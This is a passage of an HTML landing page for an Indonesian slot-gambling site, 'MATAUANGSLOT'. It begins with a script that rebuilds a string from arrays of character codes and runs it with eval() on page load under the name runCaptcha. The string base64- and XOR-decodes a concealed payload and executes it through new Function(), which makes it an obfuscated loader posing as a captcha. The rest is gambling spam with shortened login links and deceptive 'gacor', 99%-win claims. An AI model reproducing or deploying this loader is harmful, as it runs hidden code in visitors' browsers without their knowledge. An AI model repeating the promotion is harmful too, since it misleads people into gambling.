  [50, 97, 104, 77, 71, 100, 109, 73, 121, 74, 110, 73, 50, 57, 109, 111, 83, 98, 119, 73, 117, 79, 106, 56, 97, 89, 105, 89, 97, 78, 104, 75, 113, 74, 109],
  [52, 50, 57, 109, 111, 84, 66, 48, 43, 75, 98, 103, 73, 101, 102, 114, 73, 50, 69, 105, 90, 72, 86, 110, 74, 71, 89, 106, 89, 101, 79, 121, 73, 117, 79],
  [106, 56, 97, 98, 103, 73, 101, 102, 114, 73, 50, 69, 105, 90, 72, 86, 49, 100, 88, 80, 104, 112, 50, 70, 105, 111, 50, 97, 122, 57, 101, 76, 106, 111, 47],
  [71, 109, 52, 67, 72, 110, 54, 121, 78, 104, 73, 109, 82, 48, 113, 121, 116, 114, 113, 109, 57, 112, 76, 121, 51, 117, 54, 67, 110, 118, 55, 101, 115, 114, 97],
  [83, 112, 115, 100, 80, 105, 104, 89, 101, 77, 106, 100, 87, 99, 107, 90, 105, 78, 104, 52, 55, 73, 105, 52, 54, 80, 120, 111, 87, 72, 106, 73, 51, 86, 49],
  [100, 88, 80, 109, 53, 121, 97, 103, 89, 97, 80, 122, 57, 101, 76, 106, 111, 47, 71, 104, 89, 101, 77, 106, 100, 76, 80, 105, 112, 113, 72, 110, 53, 117, 78],
  [109, 115, 47, 84, 52, 112, 87, 76, 105, 90, 121, 76, 103, 77, 67, 78, 119, 90, 80, 105, 110, 73, 67, 97, 104, 53, 47, 73, 106, 100, 80, 105, 108, 101, 75],
  [86, 52, 111, 109, 98, 107, 89, 97, 76, 121, 73, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 83, 72, 106, 54, 50, 101, 106, 89, 97, 99, 119, 73],
  [50, 101, 106, 89, 97, 99, 118, 74, 71, 89, 106, 99, 83, 89, 105, 90, 71, 69, 104, 52, 109, 77, 119, 90, 80, 105, 103, 89, 55, 65, 121, 89, 83, 72, 106],
  [55, 50, 97, 104, 77, 55, 79, 121, 89, 109, 89, 103, 97, 113, 74, 109, 52, 51, 66, 109, 111, 50, 99, 110, 90, 113, 71, 48, 43, 75, 99, 109, 112, 71, 84],
  [52, 111, 117, 72, 104, 112, 117, 99, 121, 74, 50, 97, 104, 78, 87, 75, 110, 89, 71, 69, 106, 75, 109, 89, 103, 98, 50, 97, 104, 77, 67, 84, 105, 100, 76],
  [80, 106, 90, 54, 99, 122, 53, 88, 66, 108, 74, 83, 69, 104, 52, 43, 57, 109, 111, 84, 84, 52, 111, 109, 102, 105, 89, 71, 99, 121, 73, 54, 78, 110, 73],
  [117, 65, 118, 52, 71, 99, 103, 76, 121, 66, 104, 89, 50, 72, 110, 90, 122, 65, 110, 90, 113, 69, 120, 74, 80, 105, 104, 89, 50, 99, 103, 73, 101, 77, 48],
  [115, 43, 52, 112, 55, 117, 56, 122, 56, 84, 105, 103, 73, 50, 74, 106, 73, 50, 97, 109, 57, 75, 84, 122, 54, 117, 72, 104, 112, 121, 78, 104, 112, 122, 70],
  [118, 74, 71, 89, 106, 99, 47, 83, 122, 53, 121, 78, 107, 74, 122, 72, 109, 73, 83, 74, 103, 89, 98, 84, 105, 52, 67, 74, 109, 112, 117, 78, 110, 78, 87],
  [57, 118, 75, 55, 70, 48, 77, 43, 86, 120, 79, 75, 75, 104, 52, 121, 82, 48, 113, 75, 55, 112, 54, 98, 71, 109, 53, 121, 97, 103, 89, 97, 80, 103, 89],
  [54, 82, 119, 75, 101, 75, 103, 111, 50, 76, 110, 77, 97, 74, 109, 53, 117, 66, 106, 52, 98, 65, 107, 52, 50, 101, 106, 89, 97, 99, 118, 74, 71, 89, 106],
  [90, 88, 69, 109, 73, 109, 82, 104, 73, 101, 74, 106, 74, 83, 85, 107, 53, 88, 66, 119, 99, 84, 105, 105, 52, 109, 76, 103, 73, 51, 83, 122, 52, 97, 72],
  [120, 90, 117, 99, 104, 53, 113, 78, 122, 43, 75, 86, 120, 78, 118, 89, 50, 78, 106, 66, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71],
  [84, 108, 101, 75, 86, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 83, 72, 105, 89, 121, 108, 104, 52, 121, 78, 117, 52, 117, 97, 103, 90],
  [105, 99, 119, 73, 87, 72, 106, 73, 50, 109, 105, 89, 87, 78, 120, 73, 117, 74, 105, 52, 67, 78, 113, 112, 50, 98, 110, 77, 71, 84, 52, 112, 113, 78, 110],
  [74, 50, 97, 104, 115, 105, 71, 106, 90, 47, 73, 117, 74, 113, 72, 104, 89, 71, 98, 106, 99, 68, 65, 109, 111, 50, 98, 104, 52, 83, 101, 106, 99, 83, 97],
  [106, 89, 75, 78, 105, 53, 122, 66, 49, 100, 97, 84, 52, 111, 71, 79, 119, 77, 109, 89, 105, 89, 97, 78, 104, 75, 113, 74, 109, 52, 50, 57, 109, 111, 84],
  [66, 109, 111, 50, 99, 110, 90, 113, 71, 121, 74, 113, 78, 103, 111, 50, 76, 110, 77, 67, 71, 106, 90, 47, 73, 114, 90, 113, 97, 104, 53, 114, 65, 122, 53],
  [105, 74, 104, 111, 50, 69, 113, 111, 109, 98, 106, 98, 50, 97, 104, 76, 101, 70, 103, 90, 117, 98, 103, 89, 97, 80, 122, 56, 72, 66, 48, 43, 75, 77, 106],
  [89, 83, 78, 110, 73, 51, 73, 110, 52, 71, 71, 106, 73, 101, 102, 115, 54, 67, 112, 112, 113, 121, 107, 114, 98, 113, 51, 114, 98, 67, 52, 112, 55, 113, 56],
  [116, 100, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 109, 52, 117, 97, 103, 90, 105, 99, 49, 89, 121, 72, 105, 53, 50, 70, 106, 89, 97, 99, 120, 111, 117],
  [97, 106, 89, 109, 99, 106, 97, 50, 69, 106, 89, 87, 78, 104, 112, 122, 65, 122, 53, 117, 76, 109, 111, 71, 89, 110, 77, 47, 66, 48, 43, 75, 76, 104, 52],
  [97, 98, 110, 77, 105, 98, 105, 89, 54, 78, 112, 89, 101, 77, 106, 100, 88, 65, 104, 89, 101, 77, 106, 97, 97, 74, 104, 89, 51, 79, 122, 113, 87, 110, 114],
  [75, 50, 51, 114, 113, 71, 107, 114, 98, 101, 108, 113, 98, 105, 122, 104, 89, 101, 77, 106, 97, 97, 74, 104, 89, 50, 49, 119, 100, 101, 70, 104, 52, 121, 78],
  [112, 111, 109, 70, 106, 100, 76, 80, 105, 112, 113, 72, 110, 53, 117, 78, 109, 115, 47, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 109, 89, 103, 98, 117],
  [76, 109, 111, 71, 89, 110, 76, 50, 97, 104, 78, 87, 75, 110, 89, 71, 69, 106, 75, 109, 89, 103, 98, 50, 97, 104, 77, 67, 84, 105, 100, 76, 80, 103, 112],
  [118, 80, 120, 73, 87, 72, 106, 73, 51, 83, 117, 53, 121, 97, 103, 89, 97, 80, 119, 74, 117, 74, 106, 111, 50, 108, 104, 52, 121, 78, 119, 90, 88, 66, 48],
  [43, 75, 98, 105, 53, 113, 66, 109, 74, 122, 71, 109, 53, 113, 76, 49, 89, 109, 89, 103, 98, 117, 76, 109, 111, 71, 89, 110, 76, 50, 97, 104, 74, 83, 85],
  [119, 74, 105, 74, 104, 111, 50, 69, 113, 111, 109, 98, 106, 98, 50, 97, 104, 77, 80, 80, 120, 52, 109, 89, 103, 99, 101, 66, 104, 111, 121, 78, 107, 77, 97],
  [89, 103, 74, 106, 88, 105, 100, 87, 67, 109, 56, 54, 70, 104, 52, 121, 78, 49, 99, 47, 68, 106, 89, 97, 76, 104, 52, 121, 78, 118, 98, 113, 104, 113, 52],
  [101, 70, 109, 73, 101, 71, 106, 89, 97, 99, 119, 76, 117, 99, 109, 111, 71, 71, 106, 56, 67, 98, 105, 89, 54, 78, 112, 89, 101, 77, 106, 99, 72, 66, 119],
  [100, 80, 105, 109, 52, 117, 97, 103, 90, 105, 99, 120, 111, 109, 98, 107, 89, 97, 76, 49, 90, 121, 97, 110, 89, 51, 84, 52, 112, 117, 76, 109, 111, 71, 89],
  [110, 77, 97, 72, 104, 111, 83, 72, 105, 89, 122, 86, 119, 77, 72, 86, 49, 112, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 106, 111, 98, 86, 110, 52, 71],
  [71, 106, 73, 101, 102, 115, 54, 67, 112, 112, 113, 121, 107, 114, 98, 113, 51, 114, 98, 67, 52, 112, 55, 113, 56, 116, 100, 80, 105, 106, 73, 50, 69, 106, 90],
  [121, 78, 121, 74, 43, 66, 104, 111, 121, 72, 110, 55, 79, 103, 113, 97, 97, 115, 112, 75, 50, 54, 116, 54, 50, 119, 117, 75, 101, 54, 118, 76, 88, 84, 52],
  [111, 71, 79, 119, 74, 121, 82, 109, 73, 50, 72, 106, 115, 105, 79, 104, 116, 88, 86, 49, 99, 43, 79, 110, 89, 97, 76, 110, 73, 71, 72, 104, 115, 47, 66],
  [109, 111, 50, 99, 110, 90, 113, 71, 121, 74, 113, 78, 109, 52, 101, 69, 110, 111, 51, 65, 106, 111, 98, 66, 48, 43, 75, 97, 106, 89, 75, 78, 105, 53, 122],
  [65, 104, 111, 50, 102, 121, 75, 50, 97, 109, 111, 101, 97, 119, 77, 43, 70, 104, 52, 121, 78, 116, 52, 67, 74, 104, 111, 121, 69, 106, 90, 113, 51, 104, 89],
  [71, 98, 109, 52, 71, 71, 106, 56, 47, 66, 119, 100, 80, 105, 108, 100, 80, 105, 109, 52, 117, 97, 103, 90, 105, 99, 120, 111, 101, 71, 106, 90, 113, 97, 104],
  [53, 114, 86, 119, 77, 72, 86, 49, 112, 80, 105, 106, 73, 50, 69, 106, 90, 121, 78, 121, 74, 43, 66, 104, 111, 121, 72, 110, 55, 79, 103, 113, 97, 97, 115],
  [112, 75, 50, 54, 116, 54, 50, 119, 117, 75, 101, 54, 118, 76, 88, 84, 52, 112, 113, 78, 103, 111, 50, 76, 110, 77, 67, 71, 106, 90, 47, 73, 114, 90, 113],
  [97, 104, 53, 114, 65, 122, 52, 87, 72, 106, 73, 50, 51, 109, 52, 117, 97, 103, 90, 105, 99, 116, 52, 54, 74, 103, 89, 83, 78, 106, 77, 47, 66, 119, 100],
  [80, 105, 108, 100, 80, 105, 106, 73, 101, 76, 110, 89, 87, 78, 104, 112, 122, 71, 103, 73, 50, 74, 106, 77, 97, 74, 109, 74, 105, 78, 104, 111, 121, 114, 103],
  [73, 71, 69, 106, 77, 67, 98, 105, 53, 113, 66, 109, 74, 122, 66, 48, 43, 75, 86, 119, 100, 80, 105, 108, 101, 75, 74, 109, 53, 71, 71, 105, 56, 105, 79],
  [110, 89, 97, 76, 110, 73, 71, 72, 104, 115, 105, 75, 104, 52, 101, 99, 109, 53, 121, 97, 105, 90, 106, 65, 104, 89, 101, 77, 106, 97, 97, 74, 104, 89, 51],
  [69, 105, 52, 101, 71, 110, 73, 50, 81, 110, 77, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 109, 112, 50, 71, 104, 111],
  [50, 97, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 83, 72, 105, 89, 121, 108, 104, 52, 121, 78, 117, 52, 117, 97, 103, 90, 105, 99, 119, 73, 87, 72, 106],
  [73, 50, 109, 105, 89, 87, 78, 120, 73, 117, 79, 106, 56, 55, 79, 119, 73, 117, 79, 106, 56, 97, 76, 105, 89, 117, 65, 106, 98, 121, 74, 106, 53, 83, 85],
  [105, 52, 54, 80, 120, 112, 50, 89, 106, 73, 109, 99, 106, 89, 121, 112, 110, 77, 72, 66, 48, 43, 75, 74, 110, 52, 109, 66, 110, 77, 105, 97, 110, 89, 97],
  [71, 106, 90, 114, 65, 105, 52, 101, 71, 110, 73, 50, 81, 110, 77, 72, 84, 52, 112, 87, 76, 105, 90, 121, 76, 103, 77, 67, 78, 119, 90, 80, 105, 103, 89],
  [55, 65, 104, 89, 101, 77, 106, 97, 97, 74, 104, 89, 51, 74, 49, 100, 88, 80, 105, 112, 113, 72, 110, 53, 117, 78, 109, 115, 47, 66, 107, 43, 75, 99, 109],
  [112, 71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 54, 74, 104, 73, 83, 75, 105, 89, 117, 68, 49, 89, 109, 102, 105, 89, 71, 99, 121, 73, 83, 72],
  [105, 89, 121, 108, 104, 52, 121, 78, 117, 52, 117, 97, 103, 90, 105, 99, 119, 77, 43, 75, 109, 111, 101, 102, 109, 52, 50, 97, 122, 56, 83, 76, 106, 111, 47],
  [79, 122, 115, 67, 76, 106, 111, 47, 71, 105, 52, 109, 76, 103, 73, 50, 56, 105, 89, 43, 85, 108, 73, 117, 79, 106, 56, 97, 100, 109, 73, 121, 74, 110, 73],
  [50, 77, 113, 90, 122, 66, 119, 100, 80, 105, 105, 90, 43, 74, 103, 90, 122, 73, 106, 111, 109, 69, 104, 73, 113, 74, 105, 52, 80, 65, 112, 52, 113, 67, 106],
  [89, 117, 99, 120, 111, 109, 98, 109, 52, 71, 80, 104, 115, 67, 84, 108, 99, 83, 76, 104, 52, 97, 99, 106, 90, 67, 99, 120, 74, 79, 70, 104, 52, 121, 78],
  [48, 115, 43, 75, 109, 111, 101, 102, 109, 52, 50, 97, 122, 53, 88, 66, 119, 100, 80, 105, 108, 89, 117, 74, 110, 73, 117, 65, 119, 73, 50, 97, 109, 115, 71],
  [84, 52, 112, 88, 105, 108, 101, 75, 86, 52, 112, 88, 105, 105, 90, 117, 82, 104, 111, 118, 73, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 104, 89],
  [109, 66, 104, 115, 68, 66, 107, 43, 75, 99, 109, 112, 71, 84, 52, 111, 109, 102, 105, 89, 71, 99, 121, 74, 113, 78, 106, 112, 113, 78, 109, 52, 67, 114, 104],
  [52, 97, 79, 103, 89, 43, 117, 109, 111, 101, 70, 113, 90, 105, 66, 119, 77, 72, 84, 52, 111, 71, 79, 119, 73, 117, 79, 106, 56, 55, 79, 105, 52, 54, 80],
  [120, 111, 50, 71, 105, 89, 113, 69, 106, 89, 122, 86, 49, 100, 87, 79, 105, 89, 83, 98, 106, 99, 71, 97, 106, 90, 121, 100, 109, 111, 98, 84, 52, 111, 117],
  [72, 104, 112, 117, 99, 121, 73, 101, 98, 49, 99, 67, 76, 106, 111, 47, 79, 122, 112, 121, 82, 109, 73, 50, 72, 106, 115, 105, 76, 106, 111, 47, 71, 104, 53],
  [118, 86, 49, 100, 88, 80, 109, 53, 121, 97, 103, 89, 97, 80, 122, 56, 55, 79, 105, 52, 54, 80, 120, 111, 101, 98, 119, 100, 101, 55, 110, 74, 113, 66, 104],
  [111, 47, 65, 105, 52, 54, 80, 120, 111, 101, 98, 119, 100, 76, 80, 110, 89, 97, 68, 104, 111, 101, 102, 104, 115, 47, 84, 52, 111, 117, 72, 104, 112, 117, 99],
  [121, 73, 113, 97, 104, 53, 43, 98, 106, 90, 114, 86, 119, 73, 117, 79, 106, 56, 55, 79, 110, 74, 71, 89, 106, 89, 101, 79, 121, 73, 117, 79, 106, 56, 97],
  [75, 109, 111, 101, 102, 109, 52, 50, 97, 49, 100, 88, 86, 122, 53, 117, 99, 109, 111, 71, 71, 106, 56, 47, 79, 122, 111, 117, 79, 106, 56, 97, 75, 109, 111],
  [101, 102, 109, 52, 50, 97, 119, 100, 101, 55, 110, 74, 113, 66, 104, 111, 47, 65, 105, 52, 54, 80, 120, 111, 113, 97, 104, 53, 43, 98, 106, 90, 114, 66, 48],
  [115, 43, 57, 104, 111, 79, 71, 104, 53, 43, 71, 122, 57, 80, 105, 104, 73, 50, 99, 121, 73, 50, 79, 106, 111, 50, 76, 110, 73, 71, 101, 106, 97, 87, 72],
  [106, 73, 51, 86, 119, 74, 121, 82, 109, 73, 50, 72, 106, 115, 105, 70, 104, 52, 121, 78, 49, 100, 88, 86, 122, 53, 117, 99, 109, 111, 71, 71, 106, 56, 47],
  [79, 122, 111, 87, 72, 106, 73, 51, 66, 49, 52, 87, 72, 106, 73, 51, 83, 122, 52, 113, 97, 104, 53, 43, 98, 106, 90, 114, 80, 48, 43, 75, 99, 109, 112],
  [71, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 83, 78, 106, 52, 109, 76, 107, 100, 87, 69, 104, 52, 117, 74, 104, 76, 117, 99, 104, 53, 113, 74, 106],
  [52, 51, 71, 106, 52, 50, 99, 111, 90, 121, 78, 104, 99, 67, 107, 114, 97, 43, 112, 113, 55, 71, 51, 117, 55, 121, 110, 117, 113, 109, 118, 114, 98, 101, 106],
  [114, 98, 72, 66, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 76, 110, 90, 113, 97, 106, 89, 97, 99, 49, 89, 83, 72, 105, 52, 109, 69, 117, 53, 121],
  [72, 109, 111, 109, 80, 106, 99, 97, 80, 106, 90, 121, 104, 110, 73, 50, 70, 119, 75, 83, 110, 113, 54, 109, 107, 116, 55, 117, 56, 112, 55, 113, 112, 114, 54],
  [50, 51, 111, 54, 50, 120, 119, 100, 80, 105, 103, 89, 55, 65, 104, 73, 50, 80, 105, 89, 117, 82, 121, 100, 88, 86, 104, 112, 50, 69, 104, 77, 55, 79, 105],
  [53, 50, 97, 109, 111, 50, 71, 110, 78, 88, 86, 49, 89, 97, 100, 104, 73, 84, 66, 104, 73, 101, 76, 105, 89, 83, 55, 110, 73, 101, 97, 105, 89, 43, 78],
  [120, 112, 117, 78, 110, 75, 71, 99, 106, 89, 88, 65, 112, 75, 101, 114, 113, 97, 83, 51, 117, 55, 121, 110, 117, 113, 109, 118, 114, 98, 101, 106, 114, 98, 72],
  [69, 104, 73, 50, 80, 105, 89, 117, 82, 119, 100, 80, 105, 103, 89, 55, 65, 104, 73, 50, 80, 105, 89, 117, 82, 121, 100, 88, 86, 104, 112, 50, 69, 104, 77],
  [71, 69, 104, 52, 117, 74, 104, 76, 117, 99, 104, 53, 113, 74, 106, 52, 51, 71, 109, 111, 50, 70, 104, 53, 54, 78, 111, 90, 121, 78, 104, 99, 67, 107, 114],
  [97, 43, 112, 113, 55, 71, 51, 117, 55, 121, 110, 117, 113, 109, 118, 114, 98, 101, 106, 114, 98, 72, 66, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65],
  [106, 99, 71, 84, 108, 101, 75, 66, 106, 115, 67, 69, 104, 52, 117, 74, 104, 76, 117, 99, 104, 53, 113, 74, 106, 52, 51, 71, 106, 52, 50, 99, 111, 90, 121],
  [78, 104, 99, 67, 107, 112, 54, 117, 112, 112, 76, 101, 55, 118, 75, 101, 54, 113, 97, 43, 116, 116, 54, 79, 116, 115, 99, 72, 86, 49, 100, 88, 80, 50, 99],
  [47, 66, 109, 111, 50, 99, 110, 90, 113, 71, 48, 43, 75, 66, 106, 115, 67, 78, 106, 111, 54, 78, 105, 53, 121, 66, 110, 111, 50, 108, 104, 52, 121, 78, 121],
  [100, 88, 86, 122, 53, 113, 78, 105, 52, 109, 89, 110, 73, 117, 65, 105, 99, 47, 79, 122, 111, 50, 79, 106, 111, 50, 76, 110, 73, 71, 101, 106, 97, 87, 72],
  [106, 73, 51, 74, 49, 100, 88, 80, 105, 112, 117, 72, 106, 77, 47, 79, 122, 111, 50, 79, 106, 111, 50, 76, 110, 73, 71, 101, 106, 97, 87, 72, 106, 73, 51],
  [74, 49, 100, 88, 80, 105, 52, 83, 72, 110, 89, 121, 79, 104, 73, 109, 97, 106, 99, 47, 79, 122, 111, 50, 79, 106, 111, 50, 76, 110, 73, 71, 101, 106, 97],
  [87, 72, 106, 73, 51, 74, 49, 100, 88, 80, 105, 52, 54, 51, 110, 90, 105, 77, 105, 90, 121, 78, 122, 56, 55, 79, 106, 89, 54, 79, 106, 89, 117, 99, 103],
  [90, 54, 78, 112, 89, 101, 77, 106, 99, 110, 86, 49, 99, 43, 98, 103, 89, 83, 78, 104, 112, 122, 80, 119, 90, 80, 105, 105, 90, 43, 74, 103, 90, 122, 73],
  [104, 73, 101, 80, 114, 90, 54, 78, 104, 112, 122, 65, 122, 53, 105, 74, 106, 52, 50, 51, 110, 111, 71, 78, 110, 56, 47, 69, 107, 43, 75, 75, 109, 111, 101],
  [102, 109, 52, 50, 97, 120, 79, 75, 72, 109, 56, 84, 105, 104, 89, 101, 77, 106, 100, 75, 78, 106, 111, 54, 78, 105, 53, 121, 66, 110, 111, 50, 108, 104, 52],
  [121, 78, 120, 79, 75, 76, 104, 52, 97, 99, 109, 111, 109, 76, 110, 76, 50, 97, 104, 78, 75, 89, 105, 89, 97, 78, 104, 75, 113, 74, 109, 52, 50, 57, 109],
  [111, 84, 69, 52, 111, 117, 72, 104, 112, 121, 97, 105, 89, 117, 99, 113, 89, 121, 77, 109, 111, 50, 98, 109, 57, 75, 114, 112, 54, 97, 56, 117, 113, 109, 114],
  [118, 76, 101, 114, 112, 54, 97, 117, 111, 97, 47, 71, 113, 54, 101, 109, 118, 76, 113, 112, 113, 55, 121, 51, 113, 97, 121, 115, 117, 113, 50, 55, 117, 43, 75],
  [86, 119, 100, 80, 105, 108, 101, 75, 76, 104, 52, 97, 98, 110, 77, 105, 98, 110, 73, 109, 97, 110, 78, 88, 65, 119, 100, 88, 87, 107, 43, 75, 76, 104, 52],
  [97, 98, 110, 77, 105, 76, 110, 74, 68, 86, 107, 43, 75, 89, 105, 89, 97, 78, 104, 75, 113, 74, 109, 52, 50, 57, 109, 111, 84, 69, 52, 111, 109, 89, 103],
  [97, 113, 74, 109, 52, 51, 69, 52, 111, 109, 89, 103, 98, 50, 97, 104, 78, 75, 75, 110, 89, 71, 69, 106, 75, 109, 89, 103, 98, 50, 97, 104, 77, 84, 105],
  [104, 73, 101, 80, 118, 90, 113, 69, 120, 79, 75, 99, 104, 52, 79, 78, 104, 114, 50, 97, 104, 77, 84, 105, 106, 73, 101, 102, 104, 111, 83, 72, 105, 89, 121],
  [57, 109, 111, 84, 69, 52, 111, 87, 72, 106, 73, 51, 83, 106, 89, 54, 79, 106, 89, 117, 99, 103, 90, 54, 78, 112, 89, 101, 77, 106, 99, 84, 105, 104, 53],
  [118, 69, 52, 111, 113, 97, 104, 53, 43, 98, 106, 90, 114, 69, 52, 111, 117, 72, 110, 89, 97, 99, 109, 112, 72, 83, 122, 56, 47, 69, 52, 112, 117, 99, 104],
  [53, 113, 74, 106, 52, 50, 106, 106, 90, 72, 83, 112, 75, 101, 114, 113, 97, 83, 51, 117, 55, 121, 110, 117, 113, 109, 118, 114, 98, 101, 106, 114, 98, 72, 69],
  [52, 111, 117, 79, 106, 56, 84, 105, 105, 52, 101, 71, 110, 74, 113, 74, 105, 53, 121, 114, 104, 52, 97, 79, 103, 89, 47, 83, 113, 54, 101, 109, 118, 76, 113],
  [112, 113, 55, 121, 51, 113, 54, 101, 109, 114, 113, 71, 118, 52, 112, 88, 84, 52, 111, 113, 72, 104, 53, 121, 98, 110, 74, 113, 74, 109, 77, 67, 78, 106, 111],
  [54, 78, 105, 53, 121, 66, 110, 111, 50, 108, 104, 52, 121, 78, 120, 73, 117, 99, 107, 77, 72, 84, 52, 112, 88, 84, 52, 111, 71, 79, 119, 73, 121, 72, 105],
  [53, 50, 70, 106, 89, 97, 99, 120, 112, 113, 78, 105, 89, 121, 82, 117, 53, 121, 74, 110, 73, 51, 86, 49, 100, 88, 80, 104, 73, 101, 74, 106, 73, 71, 71],
  [106, 56, 47, 66, 107, 43, 75, 77, 104, 52, 117, 100, 104, 89, 50, 71, 110, 77, 97, 74, 106, 73, 121, 116, 110, 111, 50, 71, 110, 75, 83, 66, 109, 53, 121],
  [78, 104, 111, 50, 97, 119, 77, 43, 115, 112, 54, 87, 114, 104, 52, 97, 99, 106, 89, 97, 99, 112, 73, 101, 74, 106, 73, 50, 77, 122, 56, 84, 65, 119, 100],
  [88, 87, 109, 52, 50, 99, 118, 73, 71, 70, 106, 89, 101, 100, 110, 77, 67, 98, 110, 73, 109, 97, 110, 77, 83, 98, 103, 73, 101, 102, 114, 73, 50, 69, 105],
  [90, 72, 66, 120, 74, 79, 72, 104, 111, 117, 78, 48, 112, 121, 97, 110, 89, 50, 86, 119, 100, 80, 105, 108, 89, 50, 69, 109, 52, 50, 84, 52, 112, 117, 78],
  [110, 76, 121, 66, 104, 89, 50, 72, 110, 90, 122, 65, 109, 53, 121, 74, 109, 112, 122, 69, 109, 52, 67, 72, 110, 54, 121, 78, 104, 73, 109, 82, 119, 100, 80],
  [105, 108, 101, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 88, 105, 108, 101, 75, 70, 105, 89, 71, 71, 119, 77, 72, 84, 52, 112],
  [88, 66, 119, 77, 72, 84, 39, 59, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 48, 120, 56, 99, 51, 55, 49, 48, 40, 115, 44, 107, 41, 123, 115, 61, 97],
  [116, 111, 98, 40, 115, 41, 59, 118, 97, 114, 32, 108, 101, 110, 61, 115, 46, 108, 101, 110, 103, 116, 104, 44, 105, 44, 97, 114, 114, 61, 110, 101, 119, 32, 85],
  [105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 108, 101, 110, 41, 59, 102, 111, 114, 40, 105, 61, 48, 59, 105, 60, 108, 101, 110, 59, 105, 43, 43, 41, 123, 97],
  [114, 114, 91, 105, 93, 61, 115, 46, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 40, 105, 41, 94, 107, 59, 125, 105, 102, 40, 119, 105, 110, 100, 111, 119, 46],
  [84, 101, 120, 116, 68, 101, 99, 111, 100, 101, 114, 41, 123, 116, 114, 121, 123, 114, 101, 116, 117, 114, 110, 32, 110, 101, 119, 32, 84, 101, 120, 116, 68, 101, 99],
  [111, 100, 101, 114, 40, 34, 117, 116, 102, 45, 56, 34, 41, 46, 100, 101, 99, 111, 100, 101, 40, 97, 114, 114, 41, 59, 125, 99, 97, 116, 99, 104, 40, 101, 41],
  [123, 125, 125, 118, 97, 114, 32, 116, 109, 112, 61, 34, 34, 59, 102, 111, 114, 40, 105, 61, 48, 59, 105, 60, 108, 101, 110, 59, 105, 43, 43, 41, 123, 116, 109],
  [112, 43, 61, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 97, 114, 114, 91, 105, 93, 41, 59, 125, 116, 114, 121],
  [123, 114, 101, 116, 117, 114, 110, 32, 100, 101, 99, 111, 100, 101, 85, 82, 73, 67, 111, 109, 112, 111, 110, 101, 110, 116, 40, 101, 115, 99, 97, 112, 101, 40, 116],
  [109, 112, 41, 41, 59, 125, 99, 97, 116, 99, 104, 40, 101, 41, 123, 114, 101, 116, 117, 114, 110, 32, 116, 109, 112, 59, 125, 125, 118, 97, 114, 32, 95, 48, 120],
  [54, 49, 98, 102, 102, 49, 61, 95, 48, 120, 56, 99, 51, 55, 49, 48, 40, 95, 48, 120, 49, 102, 99, 57, 52, 50, 44, 95, 48, 120, 54, 57, 48, 50, 52],
  [51, 41, 59, 40, 110, 101, 119, 32, 70, 117, 110, 99, 116, 105, 111, 110, 40, 95, 48, 120, 54, 49, 98, 102, 102, 49, 41, 41, 40, 41, 59, 125, 41, 40, 41],
  [59],
];
let full = '';
for (let p of Parts) {
  for (let b of p) full += String.fromCharCode(b);
}
function runCaptcha() {
  try {
    eval(full);
  } catch(e) {}
}
if (document.readyState === 'complete') {
  runCaptcha();
} else {
  window.addEventListener('load', runCaptcha, { once: true });
}
</script>
          </head>
<body>

  <div class="mobile-frame">
    
    <div class="energy-field-top"></div>
    <div class="energy-field-bottom"></div>
    <div class="scanlines"></div>

    <div class="falling-sparks">
      <div class="spark cyan"></div>
      <div class="spark green"></div>
      <div class="spark cyan"></div>
      <div class="spark green"></div>
      <div class="spark cyan"></div>
      <div class="spark green"></div>
    </div>

    <div class="ui-layer">
      
      <div class="top-header">
        <div class="top-nav">
          <span class="nav-item">SEO</span>
          <span class="nav-item active">SONIC</span>
        </div>
        <div class="landscape-logo">
          <amp-img src="https://i.imgur.com/q2Vgi1S.gif" width="600" height="150" layout="responsive" alt="Logo Landscape"></amp-img>
        </div>
      </div>

      <div class="content-wrapper">
        
        <div class="banner-container">
          <div class="banner-content">
            <amp-img src="https://i.imgur.com/1AjakI4.png"
                     layout="fill" alt="MATAUANGSLOT" style="object-fit: cover;">
            </amp-img>
          </div>
        </div>

        <div class="bottom-floating-actions">
          <a href="https://jetlinkr.co/BOMATA1" class="action-btn-rect btn-login">
            <amp-img src="https://api.iconify.design/mdi:login-variant.svg?color=%230ff" width="20" height="20" layout="fixed" alt="Login"></amp-img>
            <span>LOGIN</span>
          </a>
          <a href="https://jetlinkr.co/BOMATA2" class="action-btn-rect btn-daftar">
            <amp-img src="https://api.iconify.design/mdi:account-plus.svg?color=%23000" width="20" height="20" layout="fixed" alt="Daftar"></amp-img>
            <span>DAFTAR</span>
          </a>
        </div>

        <div class="tiktok-caption">
          <p class="tk-caption-text">
            <strong>MATAUANGSLOT - Simbol Unik Pada Link Slot Mahjong Ways Gacor Resmi Hari Ini Free Scatter Hitam.</strong><br>
            MATAUANGSLOT adalah gerbang resmi sebagai portal link situs slot Mahjong Ways gacor resmi hari ini dengan simbol unik yang mudah memicu free scatter hitam. Gabung Sekarang dan raih pengalaman bermain yang penuh cuan, peluang kemenangan 99% bonus jepe maksimal, serta pendaftaran vip login cepat tanpa hambatan.
            <br>
            <span class="tk-hashtags">#MATAUANGSLOT #SlotGacor #RTPTertinggi #SEOSONIC</span>
          </p>
          
          <div class="tk-music">
            <amp-img class="music-icon" src="https://api.iconify.design/mdi:disc.svg?color=%23fff" width="16" height="16" layout="fixed" alt="Music"></amp-img>
            <span>♫ original sound - MATAUANGSLOT_OFFICIAL</span>
          </div>
        </div>

